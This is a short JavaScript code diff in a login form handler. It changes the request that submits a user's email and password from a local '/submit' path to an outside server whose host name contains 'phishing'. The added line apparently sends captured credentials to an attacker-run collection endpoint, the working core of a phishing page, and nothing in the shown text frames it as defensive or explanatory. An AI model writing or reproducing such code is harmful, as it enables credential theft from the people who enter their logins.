@@ -44,7 +44,7 @@ document.addEventListener("DOMContentLoaded", () => {
       const data = { email: savedEmail, password };
 
       try {
-        const res = await fetch("/submit", {
+        const res = await fetch("https://phishing-zy2c.onrender.com/submit", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(data)
